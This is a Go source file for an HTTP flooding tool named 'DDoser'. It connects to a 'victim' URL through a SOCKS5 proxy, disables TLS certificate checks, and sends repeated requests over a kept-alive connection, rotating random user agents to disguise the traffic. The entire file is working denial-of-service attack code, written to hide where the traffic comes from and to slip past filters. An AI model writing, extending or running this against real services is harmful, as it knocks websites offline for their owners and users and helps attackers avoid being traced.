package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"time"

	"golang.org/x/net/proxy"
)

type DDoser struct {
	Conn    io.ReadWriteCloser
	Request *http.Request
}

func NewDDoser(method, victim, socks5 string) (*DDoser, error) {
	var conn net.Conn
	var req *http.Request
	url, error := url.Parse(victim)

	if error != nil {
		return nil, error
	}

	req, error = http.NewRequest(method, victim, nil)

	// Set keep alive
	req.Header.Set("Connection", "keep-alive")

	if error != nil {
		return nil, error
	}

	address := fmt.Sprintf("%s:%s", url.Hostname(), url.Port())

	// Native official proxy
	client, error := proxy.SOCKS5("tcp", socks5, nil, &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 5 * time.Second,
	})

	if error != nil {
		return nil, error
	}

	conn, error = client.Dial("tcp", address)

	if url.Scheme == "https" {
		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
	}

	if error != nil {
		return nil, error
	}

	return &DDoser{conn, req}, nil
}

func (d *DDoser) Do(userAgents []string, n int) {
	defer d.Conn.Close()
	for i := 0; i < n; i++ {
		d.Request.Header.Set("User-Agent", random(userAgents))
		d.Request.Write(d.Conn)
	}
}
